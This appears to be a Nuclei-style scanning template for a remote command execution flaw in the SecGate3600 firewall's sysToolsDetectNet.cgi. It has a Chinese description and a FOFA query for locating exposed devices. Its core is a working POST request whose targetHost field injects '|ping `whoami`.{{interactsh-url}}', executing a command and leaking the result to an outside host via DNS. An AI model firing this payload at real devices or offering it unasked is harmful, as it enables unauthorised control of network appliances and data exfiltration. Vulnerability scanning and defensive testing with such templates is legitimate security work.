id: nsfocus-secgate3600-systoolsdetectnet-rce

info:
  name: "网神 SecGate3600 sysToolsDetectNet.cgi 远程命令执行"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="sec_gate_image/login_02.gif" fid="ldb0WVBlAgZloMw9AAge0A=="
      
      网神 SecGate3600 系统的 sysToolsDetectNet.cgi 接口存在远程代码执行缺陷。攻击者可通过构造特制请求参数在目标系统上执行任意shell命令，实现对设备的未授权控制。该漏洞源于CGI脚本未正确校验用户输入，导致系统命令注入风险。利用成功后可能导致敏感信息泄露、系统权限提升或服务中断。该漏洞可通过以下fofa语法定位受影响设备：body="sec_gate_image/login_02.gif" fid="ldb0WVBlAgZloMw9AAge0A=="。
  tags: 网神

http:
- raw:
  - |-
    POST /cgi-bin/sysTools/sysToolsDetectNet.cgi HTTP/1.1
    Host: {{Hostname}}
    Accept: text/plain, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Connection: close

    targetHost=|ping `whoami`.{{interactsh-url}}
  matchers:
  - type: word
    part: interactsh_protocol
    words:
      - dns